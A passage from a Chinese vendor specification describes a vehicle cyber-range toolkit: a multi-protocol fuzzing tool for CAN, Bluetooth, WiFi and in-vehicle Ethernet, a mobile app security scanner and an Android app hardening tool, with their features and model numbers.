、受害者、攻击者、攻击结果、来源区域、威胁分类、威胁名称、HTTP请求路径、HTTP状态码、应用、威胁编号</li><li>支持按照（最近1小时、最近24小时、最近7天、最近30天、自定义）展示威胁事件分析</li><li>软件license和数据库三年之内免费升级。</li></ol><h1 id="智能汽车网络靶场工具库-系统安全测试工具"><a href="#智能汽车网络靶场工具库-系统安全测试工具" class="headerlink" title="智能汽车网络靶场工具库-系统安全测试工具"></a>智能汽车网络靶场工具库-系统安全测试工具</h1><h2 id="总体概述-4"><a href="#总体概述-4" class="headerlink" title="总体概述"></a>总体概述</h2><p>车辆联网带来网络安全风险，如黑客利用漏洞进行攻击，给司乘人员带来安全威胁以及车辆的损失。车辆系统安全问题包含车载操作系统安全、开源软件安全、协议安全、应用程序安全、代码安全等。</p><p>智能汽车网络靶场工具库-系统安全测试工具可覆盖零部件、台架、整车相关的车载系统安全测试，这些测试覆盖车载APP、车载操作系统、模糊测试等。</p><p>智能汽车网络靶场工具库-系统安全测试工具包含模糊测试工具、APP动态安全分析测试工具、APP加固工具、Android应用程序反编译工具、系统漏洞扫描工具、Web安全扫描工具、集成渗透测试工具、漏洞利用工具、源代码安全审计工具、源代码开源成分析工具、二进制分析工具等。</p><h2 id="模糊测试工具"><a href="#模糊测试工具" class="headerlink" title="模糊测试工具"></a>模糊测试工具</h2><h3 id="工具概述-13"><a href="#工具概述-13" class="headerlink" title="工具概述"></a>工具概述</h3><p>对车载固件I/O、USB等接口进行模糊测试，通过覆盖多种不同协议模块和API接口的自动化智能黑盒模糊测试平台，能够有效地发现和纠正软件生命周期中潜在的安全漏洞与缺陷。</p><h3 id="工具方案-13"><a href="#工具方案-13" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="硬件方案-11"><a href="#硬件方案-11" class="headerlink" title="硬件方案"></a>硬件方案</h4><p>高性能网络接口卡：</p><p>选择具备高性能网络吞吐能力的网络接口卡，例如支持千兆以太网（Gigabit Ethernet）或更高速率的网卡。</p><p>确保网络接口卡具备低延迟和高带宽的特性，以支持车载网络安全测试工具的高效运行。</p><p>适配硬件接口设备：</p><p>设计适配硬件接口设备，包括WIFI、蓝牙（BT/BLE）、CAN/CANFD总线和USB等通信协议。</p><p>确保适配硬件接口设备与被测车辆的接口兼容，并能够稳定地进行通信。</p><p>硬件接口设备连接方式：</p><p>为适配硬件接口设备提供合适的连接方式，例如USB接口、以太网接口、CAN/CANFD总线接口等。</p><p>确保连接方式简便可靠，方便用户进行硬件设备的接入和拆卸。</p><p>可移动的硬件接口设备：</p><p>设计可移动的硬件接口设备，便于用户在不同车辆之间灵活使用。</p><p>确保硬件接口设备具备良好的移动性和便携性，方便用户进行测试工作。</p><p>硬件接口设备的稳定性和可靠性：</p><p>确保硬件接口设备具备稳定性和可靠性，能够在长时间运行和高负载条件下保持正常工作。</p><p>进行充分的测试和验证，确保硬件接口设备能够正常工作并与车载网络安全测试工具配合良好。</p><h4 id="软件方案-13"><a href="#软件方案-13" class="headerlink" title="软件方案"></a>软件方案</h4><p>分层架构：软件采用分层架构设计，主要分为以下几层：</p><p>用户界面层（UI层）：提供操作界面，用户通过这个层进行交互。</p><p>业务逻辑层：处理模糊测试的核心逻辑，如测试用例生成、执行测试、监控等。</p><p>数据访问层：管理测试数据的存储，记录和查询测试结果。</p><p>硬件抽象层：与各种硬件接口设备通信，将设备特定的信息转换为软件可以操作的数据。</p><p>模块化设计：软件功能按模块划分，每个模块负责一组功能，便于管理和扩展。</p><p>插件化测试协议：针对不同的协议（如HTTP、TCP、UDP、some/ip、CAN/CANFD等），采用插件化设计，每个协议对应一个插件模块，便于未来添加新的协议支持。</p><p>服务化组件：将一些通用功能（如日志服务、报告服务等）设计为独立的服务组件，以服务的形式运行，提高了系统的灵活性和可维护性。</p><p>用户界面模块：提供直观的操作界面，支持配置测试参数，展示实时测试状态和结果，提供测试历史记录和查询功能。</p><p>测试用例生成器模块：根据不同协议的规范生成模糊测试用例，支持自定义测试用例的生成规则，提供用例编辑器供高级用户手动编写或修改测试用例。</p><p>测试执行器模块：执行生成的测试用例，控制测试流程，如启动、暂停、停止等，与硬件接口设备交互，发送测试数据包。</p><p>硬件接口适配器模块：与可移动的硬件接口设备通信，为不同的通信协议提供统一的数据接口，支持热插拔和自动识别硬件设备。</p><p>测试监控模块：实时监控测试执行状态，捕获和记录异常事件和系统崩溃信息，支持实时日志记录和查看。</p><p>数据分析与报告模块：分析测试结果数据，计算协议状态覆盖率，生成详细的测试报告，包括潜在的安全问题和推荐的改进措施。</p><p>安全性分析模块：分析测试过程中发现的安全漏洞，提供漏洞等级评估，给出修复建议和风险评估报告。</p><p>配置管理模块：管理测试配置文件，提供配置文件的导入导出功能，支持配置的版本控制和历史比较。</p><p>日志服务模块：记录所有测试活动的详细日志，支持日志级别和格式的自定义，提供日志搜索和过滤功能。</p><p>Android Monkey测试模块：实现Android Monkey测试功能，支持多种事件的模拟，如点击、滑动、缩放等，提供测试工程、代码及说明文档。</p><h4 id="工具功能-13"><a href="#工具功能-13" class="headerlink" title="工具功能"></a>工具功能</h4><p>车载以太网协议模糊测试：工具支持对车载以太网中常用的HTTP、TCP、UDP、some/ip等协议进行模糊测试。这包括对协议字段的随机化、异常值注入、边界条件探测等多种模糊测试技术，以发现协议实现中的潜在缺陷和漏洞。</p><p>WIFI通信网络模糊测试：工具提供对WIFI通信网络的模糊测试能力，能够对WIFI协议栈进行压力测试，包括对SSID、密码、加密方式等参数进行模糊化处理，以检测网络设备在异常输入下的稳定性和安全性。</p><p>蓝牙模块协议层模糊测试：工具支持对蓝牙（BT/BLE）模块的协议层进行模糊测试，这涵盖了对蓝牙设备发现、配对、数据传输等过程中协议数据包的模糊化，旨在揭示协议栈中的漏洞。</p><p>CAN/CANFD总线协议模糊测试：工具支持对CAN和CANFD总线协议进行模糊测试，这对于汽车行业中的车辆网络安全至关重要。测试包括对消息ID、载荷、帧格式等的模糊化，以测试网络节点的异常处理能力。</p><p>USB协议模糊测试：工具提供对USB协议的模糊测试功能，通过修改USB数据包的各种参数，来测试USB主机控制器和设备的错误处理能力和安全性。</p><p>可移动硬件接口设备：工具支持适配多种通信协议所需的可移动硬件接口设备，以便于在不同的测试环境和场景下进行模糊测试。</p><p>前台操作界面：工具带有完整的前台操作界面，用户可以通过这个界面配置所有的测试参数，包括协议选择、测试用例生成、测试执行等。</p><p>易用性要求：测试软件设计注重用户体验，具有友好的用户界面和简单的操作流程，使得非专业人员也能快速上手进行测试。</p><p>测试过程记录及查询：工具支持对被测设备的测试过程进行详细记录，并提供查询功能，方便用户回溯和分析测试结果。</p><p>逻辑缺陷错误发现：工具支持在模糊测试中发现被测试设备设计的逻辑缺陷和错误，增强测试的深度和广度。</p><p>竞态条件问题：工具支持在模糊测试中识别通信协议可能产生的竞态条件问题，这对于多线程或多进程环境下的协议尤为重要。</p><p>协议栈模组层测试：工具支持对被测试协议栈的模组层进行模糊测试，以确保协议的各个模块都能正确处理异常输入。</p><p>状态转换覆盖率计算：工具支持对有状态转换协议的状态覆盖的覆盖率计算，帮助开发者了解测试的全面性。</p><p>内存越界读测试：工具支持模糊测试内存越界读操作导致的内存泄露问题，这是常见的安全问题之一。</p><p>堆空间双重释放测试：工具支持对堆空间进行双重释放模糊测试，以发现潜在的内存管理错误。</p><p>堆空间释放后重引用测试：工具支持模糊测试堆空间释放后重引用的场景，这些错误可能会导致程序崩溃或安全漏洞。</p><p>会话错误模糊测试：工具支持会话错误模糊测试，以检测协议在会话管理方面的健壮性。</p><p>协议处理会话错误测试：工具支持协议栈协议处理会话错误的模糊测试，确保协议能正确处理会话异常。</p><p>内存损坏模糊测试：工具支持协议栈处理不当导致的内存损坏模糊测试，帮助发现和修复协议栈的内存安全问题。</p><p>Android monkey测试：工具支持Android monkey测试，能够模拟用户操作，如点击、滑动、缩放等事件，以及系统按键和键盘事件等，提供完整的测试工程、代码及说明文档，帮助开发者进行全面的应用测试。</p><p>异常记录和查询：记录模糊测试过程中出现的异常情况，包括错误码、异常行为和异常数据，并提供查询功能，方便用户分析和排查问题。</p><p>自定义测试用例生成：提供灵活的测试用例生成工具，允许用户根据自身需求定制特定的模糊测试用例，以增加测试覆盖范围和深度。</p><p>模糊测试结果分析：对模糊测试结果进行自动化分析，提供统计数据和图表，帮助用户了解测试覆盖率、发现的错误类型和数量等信息。</p><p>漏洞报告生成：自动生成漏洞报告，包括发现的安全漏洞、错误详情、风险评估和建议修复措施，以便用户进行漏洞修复和安全加固。</p><h3 id="产品彩页-21"><a href="#产品彩页-21" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0bd4693a996cfd48e0b7f132140dd207.png"></p><h3 id="工具参数-13"><a href="#工具参数-13" class="headerlink" title="工具参数"></a>工具参数</h3><p>功能参数如下：</p><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLFUZZing</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>支持车载以太网HTTP、TCP、UDP、some/ip等协议模糊测试；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/803fc93b29954b5d30065f4f72b73e90.png"></p><p>HTTP模糊测试截图</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/3758512edcefdd7f3efcfa2270835266.png"></p><p>TCP模糊测试截图</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0fbacfb67dc150fdb64ff7420d31380a.png"></p><p>UDP模糊测试截图</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/030938c0faa9491bb16d6c3d3ff80450.png"></p><p>SOME/IP模糊测试截图</p><ol><li><p>支持WIFI通信网络模糊测试；</p></li><li><p>支持蓝牙（BT/BLE）模块协议层模糊测试；</p></li><li><p>支持CAN/CANFD总线协议模糊测试；</p></li><li><p>支持USB协议模糊测试；</p></li><li><p>支持适配协议所需的可移动的硬件接口设备；</p></li><li><p>带有完整的前台操作界面，所有测试皆支持从前台界面配置；</p></li><li><p>支持测试软件满足易用性要求，界面友好，操作简单；</p></li><li><p>支持被测设备的测试过程详细记录及过程信息查询；</p></li><li><p>支持对被测试设备设计逻辑缺陷错误的发现；</p></li><li><p>支持通信协议在模糊测试时产生的竞态条件问题；</p></li><li><p>支持对被测试协议栈模组层的模糊测试；</p></li><li><p>支持对有状态转换协议的状态覆盖的覆盖率计算；</p></li><li><p>支持内存越界读导致的内存泄露模糊测试；</p></li><li><p>支持堆空间双重释放模糊测试；</p></li><li><p>支持堆空间释放后重引用模糊测试；</p></li><li><p>支持会话错误模糊测试；</p></li><li><p>支持协议栈协议处理会话错误模糊测试；</p></li><li><p>支持协议栈处理不当内存损坏模糊测试；</p><p>提供了对车机进行车载以太网测试并有明显异常（包含异常重启或宕机或服务器崩溃）的实物录制视频；视频文件已放置到阿里云盘，点击链接查看：<a href="https://pan.baidu.com/s/188QF5S2Nd9lYXTAl1big9A?pwd=c1ix">https://pan.baidu.com/s/188QF5S2Nd9lYXTAl1big9A?pwd=c1ix</a> 。提取码：c1ix。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/cac47d272553d2e269151e960c26a023.png"></p><p>对车机进行车载以太网测试视频首页</p><ol><li>支持Android monkey测试，支持点击事件、滑动事件、缩放事件、轨迹球事件、系统按键事件、键盘唤出隐藏事件等测试，我方提供测试工程，测试代码及说明；</li><li>软件license和数据库三年之内免费升级。</li></ol><h2 id="APP自动化检测工具"><a href="#APP自动化检测工具" class="headerlink" title="APP自动化检测工具"></a>APP自动化检测工具</h2><h3 id="工具概述-14"><a href="#工具概述-14" class="headerlink" title="工具概述"></a>工具概述</h3><p>APP自动化检测工具涵盖Android、iOS、Android SDK、微信公众号/小程序四大检测能力。通过深度静态代码检测，动态攻击验证双重驱动，提供源代码保护、数据存储、通信传输、安全防范等超百项检测能力，使用者可依据owasp mobile top 10、国家信息安全技术标准、行业检测规范要求，通过自动化检测+自主验证的方式，贴合用户实际业务场景，全面评估应用的安全问题，准确定位问题根源，呈现详细的安全问题详情。</p><h3 id="工具方案-14"><a href="#工具方案-14" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="硬件方案-12"><a href="#硬件方案-12" class="headerlink" title="硬件方案"></a>硬件方案</h4><p>1. 硬件形态和便携性</p><p>紧凑设计：硬件应具备小巧的形态设计，便于携带，适合在不同的工作环境中使用。</p><p>轻量化材料：使用轻质材料制造外壳，减轻整体重量，增加便携性。</p><p>防护壳：提供坚固的外壳，保护硬件免受日常使用中的撞击和摔落。</p><p>2. 接口设备</p><p>多种I/O端口：至少包括USB-C、USB-A、HDMI、以太网端口，以及无线连接功能，如Wi-Fi和蓝牙，以便连接到各种设备和网络。</p><p>3. 硬件性能</p><p>高性能处理器：使用高性能的CPU，以支持复杂的安全检测算法和大量的数据处理。</p><p>大容量内存：至少16GB RAM以保证多任务和大型应用的流畅运行。</p><p>快速存储：内置高速SSD，至少512GB，以便快速读写大量数据。</p><p>高效冷却系统：设计高效的散热方案，确保长时间运行不过热。</p><p>4. 稳定性</p><p>操作系统稳定性：硬件应兼容主流操作系统，如Linux、Windows或macOS，这些操作系统已经过优化，以提高系统的稳定性和安全性。</p><p>冗余系统：关键组件如电源和存储应具备冗余设计，以防单点故障。</p><p>抗震动设计：内部组件应有固定和缓冲措施，以减少震动对硬件的影响。</p><p>备份和恢复：集成备份和恢复功能，确保在系统崩溃或硬件故障时能够快速恢复工作。</p><h4 id="软件方案-14"><a href="#软件方案-14" class="headerlink" title="软件方案"></a>软件方案</h4><p>1. 仪表盘和用户界面</p><p>用户登录/注册：安全的用户认证系统，允许用户创建账户并保护他们的个人信息。</p><p>项目管理：用户可以创建和管理他们的应用项目，上传应用文件（如APK或IPA）以进行安全分析。</p><p>实时仪表盘：展示当前分析状态、安全风险总览、最新发现的问题等关键信息。</p><p>报告生成：提供详细的安全分析报告，可供下载和分享，包含所有检测到的问题和推荐的修复措施。</p><p>2. 安卓和iOS应用安全检测</p><p>自动化扫描：上传应用后，工具自动开始扫描过程，分析应用的安全性。</p><p>恶意攻击防护能力检测：模拟各种攻击，检测应用的防护能力。</p><p>源文件和二进制代码安全检测：分析源文件和二进制代码的安全性，检查是否有安全漏洞。</p><p>本地数据存储安全检测：审查应用的本地数据存储实践，检测安全问题。</p><p>通信数据传输安全检测：评估数据传输过程中的加密和安全性。</p><p>身份认证和加密算法检测：检查身份认证流程和加密算法的安全性。</p><p>内部组件交互检测：分析内部组件的交互，检测潜在的安全风险。</p><p>混合开发App检测：针对混合开发的应用，检测HTML5代码的安全性。</p><p>第三方SDK和敏感词检测：分析集成的SDK和应用文本，检测安全和合规性问题。</p><p>安全配置检测：评估应用的安全配置设置。</p><p>3. 检测引擎和规则库</p><p>模块化检测引擎：设计为模块化结构，可以根据需要添加或更新检测规则。</p><p>规则库更新：定期更新规则库，包括最新的安全漏洞、攻击模式和合规性要求。</p><p>自定义规则：允许用户添加自定义检测规则，以适应特定的安全检测需求。</p><p>4. 集成和扩展性</p><p>API接口：提供API接口，允许集成到CI/CD流程中，实现自动化的安全检测。</p><p>插件支持：支持插件扩展，允许第三方开发者为工具提供额外的功能。</p><p>5. 安全和合规性</p><p>数据保护：确保所有上传的应用和生成的数据都得到安全的存储和传输。</p><p>合规性遵守：确保工具遵循相关的行业安全标准和法规要求。</p><h4 id="工具功能-14"><a href="#工具功能-14" class="headerlink" title="工具功能"></a>工具功能</h4><p>安卓应用检测</p><p>支持恶意攻击防护能力检测：该工具应能够模拟各种恶意攻击，如SQL注入、跨站脚本攻击（XSS）、跨站请求伪造（CSRF）等，并检测应用对这些攻击的防御能力。这包括但不限于检查输入验证、输出编码、错误处理、安全配置和会话管理等安全措施的实施情况。</p><p>支持源文件安全风险检测：工具需要能够分析APK文件的安全性，检测源代码是否易于被反编译，以及是否存在可能导致信息泄露或二次打包的安全弱点。这涉及到对代码混淆、加密字符串和资源文件的检查。</p><p>支持本地数据存储安全风险检测：检测应用是否将敏感数据（如用户凭据、个人信息等）存储在本地，并评估这些数据的存储方式是否安全。包括对SharedPreferences、SQLite数据库和文件存储的加密措施进行审查。</p><p>支持通信数据传输安全隐患检测：工具应评估应用是否使用了加密协议（如HTTPS、TLS等）来保护数据传输过程中的数据，并检查证书验证、加密算法和密钥管理等实践。</p><p>支持身份认证信息泄露风险检测：应用需要在登录和注册等身份认证环节保护用户凭据。工具应检查是否有明文传输、不安全的存储或易受攻击的认证流程存在。</p><p>支持内部组件交互风险漏洞检测：对于应用内部的组件（如活动、服务、广播接收器和内容提供者）的交互行为进行检测，确保没有过度的组件导出和不当的Intent使用，从而避免数据泄露和越权访问。</p><p>支持恶意攻击防范能力分析：该工具应分析应用的代码设计和安全漏洞防范措施，以及是否采用了保护技术，如代码混淆、运行时保护和反调试技术等。</p><p>支持混合开发App安全隐患检测：对于部分功能由HTML5开发的应用，需要检查Web视图的安全性，包括对JavaScript接口、本地存储和跨域资源共享（CORS）策略的审查。</p><p>支持第三方SDK信息检测：自动检测应用中集成的第三方SDK，包括其名称、开发者、包名、分类、来源和描述等，以及这些SDK是否有已知的安全问题或隐私泄露风险。</p><p>支持敏感词信息检测：扫描应用中的文本资源，检查是否包含敏感词或信息，涉及隐私、版权或其他合规问题。</p><p>支持安全配置检测：评估应用的安全配置，包括权限设置、网络配置、代码混淆设置等，确保应用的安全配置不会引入额外的风险。</p><p>iOS应用检测</p><p>支持应用行为安全规范检测：检查应用的行为是否符合苹果的安全规范，包括权限使用、敏感内容处理和第三方SDK的安全性。</p><p>支持二进制代码安全检测：分析应用的二进制代码，检查是否使用了代码混淆、地址空间布局随机化（ASLR）和编译器堆栈保护等技术。</p><p>支持客户端数据存储安全检测：评估应用对客户端数据的存储安全性，包括对动态调试攻击、输入监听和调试日志调用的防护措施。</p><p>支持通信数据传输安全隐患检测：与安卓应用检测相同，确保数据在传输过程中的保密性和安全性。</p><p>支持加密算法和密码安全隐患检测：检查应用使用的加密算法和密码安全措施，确保没有使用弱加密算法或不安全的随机数生成器。</p><p>支持源文件安全风险检测：与安卓应用检测相同，确保源文件的安全性。</p><p>支持混合开发App安全隐患检测：与安卓应用检测相同，检查HTML5部分的安全性。</p><p>支持iOS应用安全规范符合性检测：评估应用是否使用了不安全的API函数，是否受到XcodeGhost等恶意软件的影响，以及是否采用了自动内存管理技术等。</p><p>支持第三方SDK信息检测：与安卓应用检测相同，检查第三方SDK的安全性。</p><p>支持敏感词信息检测：与安卓应用检测相同，扫描应用中的敏感词信息。</p><h3 id="产品彩页-22"><a href="#产品彩页-22" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/138e600543e1c91bc7017e829b8d64d8.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/226ad59b1b77665a9fd6d79a191fbb4d.png"></p><h3 id="工具参数-14"><a href="#工具参数-14" class="headerlink" title="工具参数"></a>工具参数</h3><p>功能参数如下：</p><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLFAPPfnc</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>支持软件license和数据库三年之内免费升级。</li></ol><p>安卓应用检测</p><ol><li>支持检测应用是否具备对恶意攻击的防护能力</li><li>支持检测移动应用程序的源文件可能面临的安全风险，此类风险主要关系到应用的源文件安全，它们可能导致源代码被破解，文件信息泄露，篡改程序信息进行二次打包，盗版等问题</li><li>支持检测移动应用本地数据存储可能面临的安全风险及漏洞，此类问题是应用程序本地数据面临的安全隐患，可能导致移动应用的隐私数据被窃取或者破解、用户名或密码泄露、本地文件恶意读取等问题</li><li>支持检测移动应用的通信数据传输中可能面临的安全隐患，此类安全问题主要是从通信数据自身的保密性、传输过程中的安全性和数据收发双方身份验证等方面进行检测，这类安全隐患可能导致传输数据泄露的问题</li><li>支持检测移动应用在身份认证上可能存在关键信息泄露的风险，此类风险可能导致身份认证界面被劫持或监视、输入信息被监听等</li><li>支持检测移动应用内部数据在内部组件交互过程中可能面临的风险漏洞，此类风险可能导致应用程序的内部运行时交互数据泄露和第三方越权访问，应用崩溃等危害，包括组件导出、Intent组件使用不当和Receiver注册等</li><li>支持分析移动应用对于恶意攻击手段的防范能力，体现在应用代码设计、安全漏洞防范措施和是否应用保护技术等多个方面。此类技术漏洞可能会被利用直接对应用进行攻击，如恶意代码注入攻击、恶意代码远程执行、拒绝服务攻击，构造不安全的文件执行等手段</li><li>支持混合开发App就是部分功能是由html5开发的应用。针对这类Android App，自动化检测这部分代码是否存在数据泄露、代码缺陷等安全隐患</li><li>支持检测移动应用中集成的第三方SDK信息，SDK信息包含SDK名称、开发者、包名、分类、来源、描述等</li><li>支持检测移动应用中所包含的敏感词信息</li><li>支持检测移动应用在安全配置方面的设置</li></ol><p>IOS应用检测：</p><ol><li>支持检测应用本身行为是否符合安全规范，呈现出权限混乱，带有敏感内容，第三方SDK等安全内容</li><li>支持检测应用二进制代码的安全情况，主要包括代码混淆、地址空间随机化技术和编译器堆栈保护技术的使用等</li><li>支持检测应用客户端数据的存储安全，此类问题是应用程序的客户端数据安全隐患，可能导致应用的隐私数据被窃取或者被破解、以及用户名或密码泄露等问题。主要包括动态调试攻击、输入监听、调试日志调用、数据库明文存储等数据安全检测</li><li>支持检测移动应用的通信数据在传输中可能面临的安全隐患，此类安全问题主要是从通信数据自身的保密性、传输过程中的安全性和数据收发双方身份验证等方面进行检测，这类安全隐患可能导致传输数据泄露的问题</li><li>支持检测移动应用的加密算法和密码安全隐患，此类安全问题主要是针对AES/DES加密算法、弱哈希算法和随机数使用等加密方式进行检测，这类安全隐患可能导致隐私数据泄露，加密文件破解等后果，造成用户敏感信息被窃取</li><li>支持检测移动应用程序的源文件可能面临的安全风险，此类风险主要关系到应用的源文件安全，它们可能导致源代码被破解，文件信息泄露，篡改程序信息进行二次打包等问题</li><li>支持混合开发App就是部分功能是由html5开发的应用。针对这类App，自动化检测这部分代码是否存在数据泄露、代码缺陷等安全隐患</li><li>支持检测移动应用是否符合iOS应用安全规范，主要包括不安全的API函数引用、XcodeGhost感染、未使用自动管理内存技术等</li><li>支持检测移动应用中集成的第三方SDK信息，SDK信息包含SDK名称、开发者、包名、分类、来源、描述等</li><li>支持检测移动应用中所包含的敏感词信息</li><li>软件license和数据库三年之内免费升级。</li></ol><h2 id="APP加固工具"><a href="#APP加固工具" class="headerlink" title="APP加固工具"></a>APP加固工具</h2><h3 id="工具概述-15"><a href="#工具概述-15" class="headerlink" title="工具概述"></a>工具概述</h3><p>可以在不改变车机APP代码的情况下，将针对应用各种安全缺陷的保护技术集成到应用客户端内，为客户提供涵盖应用开发、打包、发布、运行全生命周期一体化安全保障服务，有效防止针对移动应用的反编译、二次打包、内存注入、动态调试、数据窃取、交易劫持、应用钓鱼等恶意攻击行为，全面保护应用软件安全。</p><h3 id="工具方案-15"><a href="#工具方案-15" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="软件方案-15"><a href="#软件方案-15" class="headerlink" title="软件方案"></a>软件方案</h4><p>1. 加密与加壳模块</p><p>DEX加密与加壳：对DEX文件进行全面加密，并应用外壳保护，防止静态分析和反编译。</p><p>SO文件保护：对SO文件执行加密和加壳操作，隐藏重要信息，如字符串和函数表。</p><p>资源文件加密：对assets、res目录下的资源文件进行加密，确保资源文件的安全。</p><p>2. 代码虚拟化与混淆模块</p><p>虚拟机技术：将DEX字节码转换为自定义虚拟机操作码，通过自定义虚拟机执行。</p><p>多套虚拟机混合保护：采用多种虚拟机和指令集，提供多层保护。</p><p>控制流平坦化：混淆控制流，使得逆向工程变得更加困难。</p><p>字符串和资源混淆：对敏感字符串和资源进行加密和混淆。</p><p>3. 完整性校验模块</p><p>APK完整性校验：对APK文件进行完整性校验，确保未被篡改或重新打包。</p><p>签名校验：在运行时校验APK的签名，确保其合法性。</p><p>文件完整性保护：对DEX、SO、脚本文件等进行完整性校验。</p><p>4. 动态保护模块</p><p>反调试保护：防止通过调试技术对应用进行分析。</p><p>反Hook保护：防止利用Xposed、Cydia Substrate、Frida等工具进行Hook攻击。</p><p>内存保护：防止内存dump和恶意代码注入。</p><p>5. 数据文件保护模块</p><p>数据库加密：对SQLite等数据库文件进行透明加密保护。</p><p>配置文件加密：对SharedPreferences、XML等配置文件进行加密保护。</p><p>文件绑定：将加密后的数据文件与设备进行绑定，防止文件复用和盗用。</p><p>6. 游戏文件保护模块</p><p>Unity DLL保护：对C#开发的Unity游戏核心DLL文件进行加密。</p><p>Cocos lua脚本保护：对Lua语言开发的Cocos游戏核心lua脚本进行加密。</p><p>7. 兼容性与集成模块</p><p>多格式支持：支持对aab文件等新格式的加固保护。</p><p>集成兼容性：确保工具可以无缝集成到现有的开发和部署流程中。</p><p>8. 用户界面（UI）和配置模块</p><p>友好的UI：提供直观的用户界面，方便用户选择加固选项和监控加固过程。</p><p>配置管理：让用户能够自定义加固的参数和规则。</p><p>9. 安全监控与日志模块</p><p>实时监控：监控应用运行时的安全状态，及时发现异常行为。</p><p>日志记录：记录所有关键操作和事件，便于事后分析和审计。</p><p>10. 更新与维护模块</p><p>自动更新：自动下载和应用加固工具的更新，确保防护措施始终保持最新。</p><p>维护支持：提供技术支持和维护服务，确保用户能够高效使用工具。</p><p>11. 测试与质量保证模块</p><p>自动化测试：提供全面的自动化测试，确保每次更新后的加固质量。</p><p>性能监控：监控加固后应用的性能，确保用户体验不受影响。。</p><h4 id="工具功能-15"><a href="#工具功能-15" class="headerlink" title="工具功能"></a>工具功能</h4><p>对加固壳的自身SO文件进行保护：加固壳的SO文件是加固工具的核心组成部分，它们通常包含了防御逻辑和加密算法。我们的工具将使用多层次的保护策略，包括代码混淆、反调试技术、以及自我修改代码能力，确保SO文件即使在被提取出来后，也无法被第三方破解工具所分析和理解。</p><p>防止自动化工具脱壳：自动化脱壳工具旨在绕过应用加固，恢复原始代码。我们的加固工具采用动态执行和代码变形技术，使得自动化工具无法确定脱壳的正确时机和方法，从而有效防止脱壳行为。</p><p>对DEX文件整体加密、加壳保护：DEX文件包含了应用的Dalvik字节码，是Android应用逆向工程的主要目标。我们的加固工具将对DEX文件进行整体加密，并应用加壳技术，使得未经授权的静态分析工具无法还原源代码。</p><p>对DEX代码内的明文字符串进行加密保护：明文字符串往往包含敏感信息，如API密钥、服务器地址等。我们通过加密这些字符串，确保即使DEX文件被反编译，这些信息也不会轻易泄露。</p><p>对DEX内的代码进行静态抽取和加密：我们的工具支持对DEX文件内的类和方法进行静态抽取，将其加密存储，并在运行时动态解密执行。这种方法不仅增加了逆向工程的难度，而且也在一定程度上防止了动态调试。</p><p>自定义虚拟机操作码：通过将DEX字节码转换为自定义的虚拟机操作码，并在自定义虚拟机中解释执行，我们可以有效地隐藏程序的真实逻辑，增加逆向工程的复杂度。</p><p>多套虚拟机及指令的复合保护技术：我们实现了多种自定义虚拟机和指令集，通过复合保护技术，为每个应用创建独一无二的保护模式，使得攻击者无法通过分析一款应用来攻破其他应用。</p><p>最小细粒度的独立虚拟化保护：为了进一步提高安全性，我们的工具支持对每个函数实施独立虚拟化保护，为其分配独特的指令集，使得攻击者无法构建持续有效的攻击策略。</p><p>全范围函数的虚拟化保护（VMP）：VMP技术覆盖了全部代码，不仅防止静态分析，同时也使得运行时的动态dump变得极其困难。</p><p>对SO文件及其内部信息的保护：我们对SO文件进行加密和加壳保护，同时对内部的字符串和函数表信息进行加密隐藏，防止通过IDA等工具进行逆向分析。</p><p>对Unity和Cocos游戏文件的加密保护：对于使用C#语言开发的Unity游戏核心DLL文件和Lua语言开发的Cocos游戏核心lua脚本文件，我们提供了专门的加密保护方案，确保这些游戏脚本不会被轻易篡改和逆向。</p><p>完整性校验：我们对APK内的所有文件进行完整性校验，确保它们没有被篡改或二次打包。同时，在APK运行时，我们会校验其签名的合法性，进一步保障应用的完整性和安全性。</p><p>动态保护：我们的动态保护功能可以实时监测和阻断调试和hook行为，基于源代码一体化自动加固实现，避免了基于SDK集成可能带来的单点绕过风险。</p><p>透明加密保护：支持对包括数据库文件、SharedPreferences数据文件、Webview数据文件在内的各种数据文件进行透明加密保护，并且可以将这些加密后的数据文件与设备绑定，防止文件复用和盗用。</p><p>控制流平坦化和混淆：在不改变程序语义的前提下，我们的工具可以通过控制流平坦化混淆程序的控制流，隐藏跳转逻辑的判断值，增加逆向分析的难度。同时，混淆每次都引入随机性，保证每次生成的混淆代码都是独一无二的。</p><p>防止动态调试和Hook攻击：我们的加固工具能够防止通过GDB、LLDB等工具进行动态调试，以及通过Inline Hook和Swizzling Hook工具进行的代码篡改攻击。。</p><h3 id="产品彩页-23"><a href="#产品彩页-23" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/6bb88de15cb7ae2a3a4d6d0ab49f07f4.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/31e7430808ab4fe2355568cc00506242.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/b98054220ce3c668531c643773ae3836.png"></p><h3 id="工具参数-15"><a href="#工具参数-15" class="headerlink" 